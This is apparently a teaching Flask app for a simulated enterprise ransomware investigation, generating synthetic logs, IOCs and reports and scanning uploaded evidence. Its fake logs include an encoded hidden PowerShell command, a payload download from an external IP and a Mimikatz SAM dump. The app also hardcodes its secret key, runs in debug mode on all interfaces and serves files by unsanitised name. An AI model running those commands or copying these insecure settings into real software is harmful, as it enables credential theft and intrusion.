from __future__ import annotations

import csv
import hashlib
import io
import json
import os
import re
from datetime import datetime, timezone
from pathlib import Path
from tempfile import NamedTemporaryFile
from typing import Any, Dict, Iterable, List

from flask import Flask, flash, redirect, render_template, request, send_file, session, url_for

BASE_DIR = Path(__file__).resolve().parent
GENERATED_DIR = BASE_DIR / "generated"
UPLOAD_DIR = BASE_DIR / "uploads"
ALLOWED_EXTENSIONS = {"json", "csv", "txt", "log"}
MAX_FILE_SIZE = 5 * 1024 * 1024

app = Flask(__name__)
app.config["SECRET_KEY"] = "enterprise-ir-demo-secret"
app.config["MAX_CONTENT_LENGTH"] = MAX_FILE_SIZE


def utc_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def safe_read_text(raw_bytes: bytes) -> str:
    for encoding in ("utf-8", "utf-8-sig", "latin-1"):
        try:
            return raw_bytes.decode(encoding)
        except UnicodeDecodeError:
            continue
    return raw_bytes.decode("utf-8", errors="replace")


def generate_synthetic_evidence() -> Dict[str, Any]:
    GENERATED_DIR.mkdir(parents=True, exist_ok=True)

    incident_timeline = {
        "metadata": {
            "scenario": "Enterprise Ransomware Outbreak & Containment Architecture",
            "generated_at": utc_now(),
            "source": "Synthetic Evidence Generator",
            "environment": "Yenepoya University Research Grid",
            "classification": "SIMULATED INTERNAL C2 / RANSOMWARE DEMO",
        },
        "events": [
            {
                "timestamp": "2026-09-15T08:20:17Z",
                "host": "FIN-WS-204",
                "endpoint": "172.22.10.42",
                "event": "PowerShell process spawned from a PDF viewer",
                "source": "windows_event_log",
                "severity": "High",
                "technique": "T1059.001",
            },
            {
                "timestamp": "2026-09-15T08:28:45Z",
                "host": "FIN-WS-204",
                "endpoint": "172.22.10.42",
                "event": "Credential dumping attempt using Mimikatz-like sequence",
                "source": "powershell_log",
                "severity": "Critical",
                "technique": "T1003",
            },
            {
                "timestamp": "2026-09-15T08:36:12Z",
                "host": "FIN-DC-01",
                "endpoint": "172.22.10.10",
                "event": "Kerberos ticket enumeration and lateral movement to domain controller",
                "source": "endpoint_activity",
                "severity": "Critical",
                "technique": "T1550",
            },
            {
                "timestamp": "2026-09-15T08:42:04Z",
                "host": "FIN-SRV-12",
                "endpoint": "172.22.10.51",
                "event": "File encryption service active; .locked extension written to shared drive",
                "source": "network_connections",
                "severity": "Critical",
                "technique": "T1486",
            },
            {
                "timestamp": "2026-09-15T08:53:19Z",
                "host": "FIN-NET-09",
                "endpoint": "172.22.10.77",
                "event": "Beaconing to malicious domain ui-ops.financecloud.local",
                "source": "network_connections",
                "severity": "High",
                "technique": "T1071",
            },
        ],
    }

    windows_event_logs = {
        "metadata": {
            "source": "Windows Event Logs",
            "generated_at": utc_now(),
            "host_count": 5,
            "format": "JSON",
        },
        "events": [
            {
                "timestamp": "2026-09-15T08:20:17Z",
                "computer_name": "FIN-WS-204",
                "event_id": 4688,
                "event_name": "New Process Created",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -nop -window hidden -enc JABjAGEAbAB...",
                "user": "FIN\\jdoe",
                "severity": "High",
            },
            {
                "timestamp": "2026-09-15T08:27:11Z",
                "computer_name": "FIN-WS-204",
                "event_id": 4624,
                "event_name": "Logon Success",
                "process_name": "svchost.exe",
                "user": "FIN\\svc_maintenance",
                "severity": "Medium",
            },
            {
                "timestamp": "2026-09-15T08:36:12Z",
                "computer_name": "FIN-DC-01",
                "event_id": 4771,
                "event_name": "Kerberos pre-authentication failed",
                "process_name": "lsass.exe",
                "user": "FIN\\admin_user",
                "severity": "Critical",
            },
        ],
    }

    powershell_logs = {
        "metadata": {
            "source": "PowerShell Logs",
            "generated_at": utc_now(),
            "format": "JSON",
        },
        "entries": [
            {
                "timestamp": "2026-09-15T08:20:18Z",
                "host": "FIN-WS-204",
                "user": "jdoe",
                "command": "Invoke-WebRequest -Uri http://91.210.248.18/update.ps1 -OutFile C:WindowsTempupdate.ps1",
                "action": "downloaded payload",
            },
            {
                "timestamp": "2026-09-15T08:24:41Z",
                "host": "FIN-WS-204",
                "user": "jdoe",
                "command": "Get-Process | Where-Object {$_.ProcessName -eq 'mspaint' }",
                "action": "execution discovery",
            },
            {
                "timestamp": "2026-09-15T08:28:52Z",
                "host": "FIN-WS-204",
                "user": "jdoe",
                "command": "Invoke-Mimikatz -Command 'privilege::debug lsadump::sam'",
                "action": "credential harvesting",
            },
        ],
    }

    endpoint_activity = {
        "metadata": {
            "source": "Endpoint Activity",
            "generated_at": utc_now(),
            "format": "JSON",
        },
        "activities": [
            {
                "timestamp": "2026-09-15T08:18:40Z",
                "host": "FIN-WS-204",
                "process": "AcroRd32.exe",
                "user": "jdoe",
                "description": "Suspicious PDF viewer spawned hidden PowerShell subsystem",
                "suspicious": True,
            },
            {
                "timestamp": "2026-09-15T08:35:00Z",
                "host": "FIN-DC-01",
                "process": "wmic.exe",
                "user": "FIN\\admin_user",
                "description": "Remote execution against production host list",
                "suspicious": True,
            },
            {
                "timestamp": "2026-09-15T08:42:06Z",
                "host": "FIN-SRV-12",
                "process": "ransomware.exe",
                "user": "SYSTEM",
                "description": "Service began encrypting shared network drives",
                "suspicious": True,
            },
        ],
    }

    network_connections = {
        "metadata": {
            "source": "Network Connections",
            "generated_at": utc_now(),
            "format": "JSON",
        },
        "connections": [
            {
                "timestamp": "2026-09-15T08:20:32Z",
                "source_ip": "172.22.10.42",
                "destination_ip": "91.210.248.18",
                "destination_domain": "update.financecloud.local",
                "protocol": "HTTP",
                "bytes_sent": 1622,
                "suspicious": True,
            },
            {
                "timestamp": "2026-09-15T08:36:20Z",
                "source_ip": "172.22.10.42",
                "destination_ip": "172.22.10.10",
                "destination_domain": "fin-dc-01.financecloud.local",
                "protocol": "SMB",
                "bytes_sent": 4052,
                "suspicious": True,
            },
            {
                "timestamp": "2026-09-15T08:53:10Z",
                "source_ip": "172.22.10.51",
                "destination_ip": "192.168.44.9",
                "destination_domain": "ui-ops.financecloud.local",
                "protocol": "HTTPS",
                "bytes_sent": 660,
                "suspicious": True,
            },
        ],
    }

    ioc_database = {
        "metadata": {
            "generated_at": utc_now(),
            "scenario": "Ransomware IOC Set",
            "sources": ["PowerShell logs", "Network connections", "Endpoint activity"],
        },
        "iocs": [
            {"type": "ipv4", "value": "91.210.248.18", "risk": "High", "source": "payload download"},
            {"type": "domain", "value": "update.financecloud.local", "risk": "High", "source": "C2 domain"},
            {"type": "domain", "value": "ui-ops.financecloud.local", "risk": "High", "source": "beaconing"},
            {"type": "hash", "value": "cc5fd27efb6089250c83f2d5d4d7c77f2607f8c2b0a8f3d4d2033767e9d9740b", "risk": "Critical", "source": "malware sample"},
            {"type": "file", "value": "C:\\Windows\\Temp\\update.ps1", "risk": "High", "source": "payload staging"},
            {"type": "extension", "value": ".locked", "risk": "Critical", "source": "ransom note indicator"},
        ],
    }

    affected_hosts = {
        "metadata": {
            "generated_at": utc_now(),
            "total_affected": 6,
            "scope": "Enterprise endpoints and file servers",
        },
        "hosts": [
            {"hostname": "FIN-WS-204", "ip": "172.22.10.42", "status": "Contained", "role": "User workstation"},
            {"hostname": "FIN-DC-01", "ip": "172.22.10.10", "status": "Isolated", "role": "Domain controller"},
            {"hostname": "FIN-SRV-12", "ip": "172.22.10.51", "status": "Encrypted", "role": "File server"},
            {"hostname": "FIN-APP-03", "ip": "172.22.10.31", "status": "Pending triage", "role": "Application server"},
            {"hostname": "FIN-NET-09", "ip": "172.22.10.77", "status": "Monitoring", "role": "Firewall appliance"},
            {"hostname": "FIN-LAP-12", "ip": "172.22.10.84", "status": "Re-imaged", "role": "Remote endpoint"},
        ],
    }

    recovery_validation = {
        "metadata": {
            "generated_at": utc_now(),
            "environment": "Yenepoya University Labs",
            "classification": "SIMULATED RECOVERY VALIDATION",
        },
        "checkpoints": [
            {"name": "Endpoint isolation", "status": "Passed", "details": "Firewall rules applied, VLAN quarantine completed."},
            {"name": "Credential reset", "status": "Passed", "details": "Password resets for privileged accounts completed."},
            {"name": "Backup verification", "status": "Warning", "details": "Two backup jobs flagged for missing verification prior to restoration."},
            {"name": "System rehydrate", "status": "In Progress", "details": "Re-imaging of affected workstations underway."},
        ],
    }

    incidents = [
        {
            "incident_id": "IR-2026-041",
            "title": "Ransomware deployment on FIN-WS-204",
            "severity": "Critical",
            "status": "Contained",
            "detection_time": "2026-09-15T08:42:00Z",
            "description": "Malicious PowerShell script executed on a finance workstation and began encrypting mapped shares.",
            "affected_hosts": ["FIN-WS-204", "FIN-SRV-12", "FIN-DC-01"],
            "initial_access_vector": "Phishing lure containing a disguised Adobe PDF and embedded PowerShell payload",
            "suspected_threat_actor": "TA-17 / FogCrypt Group",
            "mitre_techniques": ["T1059.001", "T1078", "T1550", "T1486"],
            "assigned_analyst": "M. Rodriguez",
            "investigation_notes": "Domain credential abuse was observed after execution. The threat actor likely moved laterally to file shares before encryption started.",
            "containment_status": "Network isolation completed",
            "recovery_status": "Recovery in progress",
        },
        {
            "incident_id": "IR-2026-042",
            "title": "Lateral movement and credential access",
            "severity": "High",
            "status": "Investigating",
            "detection_time": "2026-09-15T08:36:00Z",
            "description": "Kerberos and local credential access attempts were observed on network services and domain endpoints.",
            "affected_hosts": ["FIN-DC-01", "FIN-APP-03"],
            "initial_access_vector": "Service account abuse and remote admin credential reuse",
            "suspected_threat_actor": "Shadow network operators",
            "mitre_techniques": ["T1003", "T1555", "T1021.002"],
            "assigned_analyst": "L. Bennett",
            "investigation_notes": "Evidence suggests credential dumping from the finance workstation followed by lateral movement attempts.",
            "containment_status": "Ports blocked",
            "recovery_status": "Pending validation",
        },
        {
            "incident_id": "IR-2026-043",
            "title": "Suspicious beaconing and exfiltration",
            "severity": "Medium",
            "status": "Monitoring",
            "detection_time": "2026-09-15T08:53:00Z",
            "description": "Beaconing to external infrastructure matched a known malware command-and-control domain.",
            "affected_hosts": ["FIN-NET-09", "FIN-WS-204"],
            "initial_access_vector": "External C2 and encoded command execution",
            "suspected_threat_actor": "Unattributed extortion group",
            "mitre_techniques": ["T1071.001", "T1105", "T1567"],
            "assigned_analyst": "S. Narayan",
            "investigation_notes": "Traffic was isolated from the enterprise edge and no direct data theft was confirmed at this stage.",
            "containment_status": "Packet filtering active",
            "recovery_status": "Awaiting forensics closure",
        },
    ]

    incident_metadata = {
        "metadata": {
            "generated_at": utc_now(),
            "incident_scope": "enterprise ransomware demonstration",
            "team": "Group 2",
            "institution": "Yenepoya University",
        },
        "summary": {
            "total_incidents": len(incidents),
            "critical_incidents": 1,
            "affected_endpoints": 6,
            "contained_endpoints": 3,
            "pending_investigations": 2,
            "recovery_status": "In Progress",
            "severity_distribution": {"Critical": 1, "High": 1, "Medium": 1, "Low": 0},
        },
        "incidents": incidents,
    }

    manifest = {
        "incident_timeline.json": incident_timeline,
        "windows_event_logs.json": windows_event_logs,
        "powershell_logs.json": powershell_logs,
        "endpoint_activity.json": endpoint_activity,
        "network_connections.json": network_connections,
        "ioc_database.json": ioc_database,
        "affected_hosts.json": affected_hosts,
        "recovery_validation.json": recovery_validation,
        "incident_metadata.json": incident_metadata,
    }

    for file_name, payload in manifest.items():
        with (GENERATED_DIR / file_name).open("w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2)

    return incident_metadata


def load_incident_metadata() -> Dict[str, Any]:
    file_path = GENERATED_DIR / "incident_metadata.json"
    if not file_path.exists():
        return generate_synthetic_evidence()
    with file_path.open("r", encoding="utf-8") as handle:
        return json.load(handle)


def build_dashboard_payload() -> Dict[str, Any]:
    incident_data = load_incident_metadata()
    summary = incident_data["summary"]
    severity_data = summary["severity_distribution"]
    timeline = [
        {"label": "Sep 10", "value": 0},
        {"label": "Sep 11", "value": 1},
        {"label": "Sep 12", "value": 2},
        {"label": "Sep 13", "value": 3},
        {"label": "Sep 14", "value": 2},
        {"label": "Sep 15", "value": 4},
    ]
    threat_activity = [
        {"label": "PowerShell", "value": 32},
        {"label": "Lateral Movement", "value": 18},
        {"label": "Encryption", "value": 12},
        {"label": "Beaconing", "value": 9},
    ]
    alerts = [
        "Credential abuse observed on FIN-WS-204.",
        "Firewall blocked beacon to update.financecloud.local.",
        "File shard encryption started on FIN-SRV-12.",
        "Privileged account reset coordination underway.",
    ]
    return {
        "metrics": summary,
        "chart_data": {
            "severity": {"labels": list(severity_data.keys()), "values": list(severity_data.values())},
            "timeline": {"labels": [point["label"] for point in timeline], "values": [point["value"] for point in timeline]},
            "threat_activity": {"labels": [point["label"] for point in threat_activity], "values": [point["value"] for point in threat_activity]},
        },
        "alerts": alerts,
    }


def flatten_strings(value: Any) -> Iterable[str]:
    if isinstance(value, str):
        yield value
        return
    if isinstance(value, dict):
        for child in value.values():
            yield from flatten_strings(child)
        return
    if isinstance(value, list):
        for child in value:
            yield from flatten_strings(child)


def extract_iocs(payload: Any) -> List[str]:
    strings = list(flatten_strings(payload))
    text = "\n".join(strings)
    patterns = [
        r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
        r"\b(?:[A-Za-z0-9-]+\.)+(?:local|com|net|org|corp)\b",
        r"\b[A-Fa-f0-9]{64}\b",
        r"[A-Za-z0-9_.-]+\\.exe",
        r"\.locked|\.encrypted|\.crypt",
        r"powershell\.exe|wmic\.exe|rundll32\.exe",
    ]
    collected: List[str] = []
    for pattern in patterns:
        matches = re.findall(pattern, text, flags=re.IGNORECASE)
        for match in matches:
            candidate = match.strip()
            if candidate and candidate not in collected:
                collected.append(candidate)
    return collected


def build_timeline(records: Any) -> List[Dict[str, str]]:
    timeline: List[Dict[str, str]] = []
    queue: List[Any] = []
    if isinstance(records, list):
        queue = records
    elif isinstance(records, dict):
        queue = [records]

    for entry in queue:
        if not isinstance(entry, dict):
            continue
        candidates = [
            entry.get("timestamp"),
            entry.get("event_time"),
            entry.get("TimeCreated"),
            entry.get("date"),
            entry.get("time"),
            entry.get("occurred_at"),
        ]
        stamp = next((item for item in candidates if isinstance(item, str) and item), None)
        if not stamp:
            continue
        timeline.append(
            {
                "timestamp": stamp,
                "host": entry.get("host") or entry.get("computer_name") or entry.get("endpoint") or "unknown",
                "activity": entry.get("event") or entry.get("action") or entry.get("description") or entry.get("command") or "activity",
            }
        )

    timeline.sort(key=lambda item: item["timestamp"])
    return timeline[:12]


def analyze_uploaded_file(filename: str, file_bytes: bytes) -> Dict[str, Any]:
    file_hash = hashlib.sha256(file_bytes).hexdigest()
    extension = os.path.splitext(filename)[1].lower().lstrip(".")
    metadata = {
        "source_file": filename,
        "size_bytes": len(file_bytes),
        "extension": extension,
        "sha256": file_hash,
        "analyzed_at": utc_now(),
    }

    safe_name = os.path.basename(filename)
    upload_target = UPLOAD_DIR / safe_name
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
    upload_target.write_bytes(file_bytes)

    records: Any = None
    error: str | None = None
    text = safe_read_text(file_bytes)

    try:
        if extension == "json":
            records = json.loads(text)
        elif extension == "csv":
            csv_reader = csv.DictReader(io.StringIO(text))
            records = list(csv_reader)
        else:
            records = text.splitlines()
    except Exception as exc:  # noqa: BLE001
        error = f"Parsing failed: {exc}"

    iocs = extract_iocs(records if records is not None else text)
    suspicious = []
    suspicious_keywords = [
        "powershell",
        "mimikatz",
        "ransom",
        "encrypt",
        "credential",
        "beacon",
        "malware",
        "wmic",
        "lsass",
        ".locked",
    ]
    normalized_text = text.lower()
    for keyword in suspicious_keywords:
        if keyword in normalized_text:
            suspicious.append(keyword)

    timeline = build_timeline(records) if records is not None else []
    integrity_status = "Validated hash recorded - no execution attempted"
    if extension in {"json", "csv"} and records is not None:
        integrity_status = "Pass - file parsed successfully and hash recorded"

    summary = {
        "filename": filename,
        "type": extension,
        "sha256": file_hash,
        "iocs_count": len(iocs),
        "timeline_events": len(timeline),
        "suspicious_patterns": suspicious,
        "integrity_status": integrity_status,
    }

    return {
        "filename": filename,
        "file_type": extension,
        "file_size": len(file_bytes),
        "sha256": file_hash,
        "metadata": metadata,
        "records": records,
        "timeline": timeline,
        "iocs": iocs,
        "suspicious_activity": suspicious,
        "integrity_status": integrity_status,
        "summary": summary,
        "error": error,
        "stored_path": str(upload_target),
    }


def create_report(incident_id: str | None = None, analysis: Dict[str, Any] | None = None) -> str:
    if analysis is None:
        incident_data = load_incident_metadata()
        report_lines = [
            "Enterprise Ransomware Outbreak & Containment Architecture",
            "------------------------------------------------------",
            "Scenario: Simulated enterprise ransomware investigation",
            "Generated: {}".format(utc_now()),
            "",
            "Incident Summary",
            "Total incidents: {}".format(incident_data["summary"]["total_incidents"]),
            "Critical incidents: {}".format(incident_data["summary"]["critical_incidents"]),
            "Affected endpoints: {}".format(incident_data["summary"]["affected_endpoints"]),
            "Containment status: {}".format(incident_data["summary"]["recovery_status"]),
            "",
            "Observed MITRE coverage:",
            "- T1059.001 PowerShell execution",
            "- T1003 Credential dumping",
            "- T1550 Lateral movement",
            "- T1486 Data encryption",
        ]
        return "\n".join(report_lines)

    incident = None
    if incident_id:
        for item in load_incident_metadata().get("incidents", []):
            if item["incident_id"] == incident_id:
                incident = item
                break

    lines = [
        "Enterprise Incident Response Investigation Report",
        "==============================================",
        "",
        f"Evidence file: {analysis['filename']}",
        f"SHA-256: {analysis['sha256']}",
        f"File type: {analysis['file_type']}",
        f"Integrity status: {analysis['integrity_status']}",
        "",
        "Key IOC findings:",
    ]
    if analysis.get("iocs"):
        for ioc in analysis["iocs"][:10]:
            lines.append(f"- {ioc}")
    else:
        lines.append("- No IOC patterns identified in the provided file.")

    lines.extend([
        "",
        "Suspicious activity indicators:",
    ])
    if analysis.get("suspicious_activity"):
        for indicator in analysis["suspicious_activity"]:
            lines.append(f"- {indicator}")
    else:
        lines.append("- No suspicious keywords detected.")

    if incident:
        lines.extend([
            "",
            "Incident Details:",
            f"Incident ID: {incident['incident_id']}",
            f"Title: {incident['title']}",
            f"Severity: {incident['severity']}",
            f"Assigned analyst: {incident['assigned_analyst']}",
            f"Containment status: {incident['containment_status']}",
        ])

    return "\n".join(lines) + "\n"


@app.route("/")
def dashboard():
    payload = build_dashboard_payload()
    return render_template("dashboard.html", **payload)


@app.route("/incidents")
def incidents_page():
    incident_data = load_incident_metadata()
    return render_template("incidents.html", incidents=incident_data.get("incidents", []))


@app.route("/incident/<incident_id>")
def incident_detail(incident_id: str):
    incident_data = load_incident_metadata()
    incident = next((item for item in incident_data.get("incidents", []) if item["incident_id"] == incident_id), None)
    if incident is None:
        flash("Incident not found.")
        return redirect(url_for("incidents_page"))
    return render_template("incident_detail.html", incident=incident)


@app.route("/forensics", methods=["GET", "POST"])
def forensics_page():
    generated_files = sorted(path.name for path in GENERATED_DIR.glob("*.json")) if GENERATED_DIR.exists() else []
    current_analysis = session.get("latest_analysis")
    if request.method == "POST":
        uploaded = request.files.get("evidence_file")
        if uploaded is None or uploaded.filename == "":
            flash("Please choose a file to upload.")
            return render_template("forensics.html", analysis=current_analysis, evidence_files=generated_files)

        raw = uploaded.read()
        if len(raw) > MAX_FILE_SIZE:
            flash("Uploaded file exceeds the 5MB evidence limit.")
            return render_template("forensics.html", analysis=current_analysis, evidence_files=generated_files)

        extension = os.path.splitext(uploaded.filename)[1].lower().lstrip(".")
        if extension not in ALLOWED_EXTENSIONS:
            flash("Unsupported file type. Upload a JSON, CSV, TXT, or LOG evidence file.")
            return render_template("forensics.html", analysis=current_analysis, evidence_files=generated_files)

        analysis = analyze_uploaded_file(uploaded.filename, raw)
        session["latest_analysis"] = analysis
        return render_template("forensics.html", analysis=analysis, evidence_files=generated_files)

    return render_template("forensics.html", analysis=current_analysis, evidence_files=generated_files)


@app.route("/generate-evidence")
def generate_evidence():
    generate_synthetic_evidence()
    flash("Synthetic evidence pack generated successfully.")
    return redirect(url_for("forensics_page"))


@app.route("/generated/<filename>")
def serve_generated_file(filename: str):
    file_path = GENERATED_DIR / filename
    if not file_path.exists():
        flash("Requested evidence file is not available.")
        return redirect(url_for("forensics_page"))
    return send_file(file_path, as_attachment=True, download_name=filename)


@app.route("/download-report")
def download_report():
    analysis = session.get("latest_analysis")
    report_text = create_report(analysis=analysis)
    with NamedTemporaryFile("w", suffix=".txt", delete=False) as handle:
        handle.write(report_text)
        temp_path = handle.name
    return send_file(temp_path, as_attachment=True, download_name="incident_investigation_report.txt")


@app.route("/report")
def report_page():
    analysis = session.get("latest_analysis")
    if analysis is None:
        incident_metadata = load_incident_metadata()
        report_content = create_report(analysis=None)
    else:
        report_content = create_report(analysis=analysis)
    return render_template("report.html", report=report_content)


@app.route("/export-incident/<incident_id>")
def export_incident(incident_id: str):
    metadata = load_incident_metadata()
    incident = next((item for item in metadata.get("incidents", []) if item["incident_id"] == incident_id), None)
    if incident is None:
        flash("Incident report not available.")
        return redirect(url_for("incidents_page"))
    report_text = create_report(incident_id=incident_id, analysis=None)
    with NamedTemporaryFile("w", suffix=".txt", delete=False) as handle:
        handle.write(report_text)
        temp_path = handle.name
    return send_file(temp_path, as_attachment=True, download_name=f"{incident_id}_report.txt")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
